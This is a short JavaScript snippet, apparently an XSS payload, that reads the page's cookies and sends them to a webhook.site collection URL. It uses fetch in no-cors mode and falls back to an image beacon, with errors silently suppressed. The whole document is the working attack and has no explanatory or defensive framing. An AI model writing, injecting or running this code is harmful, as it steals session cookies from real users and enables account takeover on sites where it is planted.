(async () => {
  try {
    const cookie = document.cookie || '';
    const url = 'https://webhook.site/03352272-bffa-4bc8-b726-8e576c1acd58?c=' + encodeURIComponent(cookie);
    try {
      await fetch(url, { method: 'GET', mode: 'no-cors' });
    } catch(e){
      const i = new Image();
      i.src = url;
    }
  } catch (e) {
  }
})();